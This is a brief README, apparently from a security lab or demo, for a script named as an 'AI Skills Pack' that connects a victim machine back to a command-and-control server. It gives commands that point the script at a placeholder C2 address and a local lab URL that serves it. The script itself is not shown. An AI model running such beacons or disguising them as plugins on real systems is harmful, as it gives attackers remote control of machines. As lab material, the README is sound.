# Neural Nexus AI Skills Pack

**Demo component** — connects the victim machine back to the Neural-Nexus C2.

## Usage (from the victim machine)

```bash
# Point to your C2 server
python neural_nexus_skill.py --c2 http://<c2-ip>:5001

# Or via environment variable
NN_C2=http://<c2-ip>:5001 python neural_nexus_skill.py
```

The script is served by the victim-lab at:
```
GET http://localhost:8080/skill/download
```
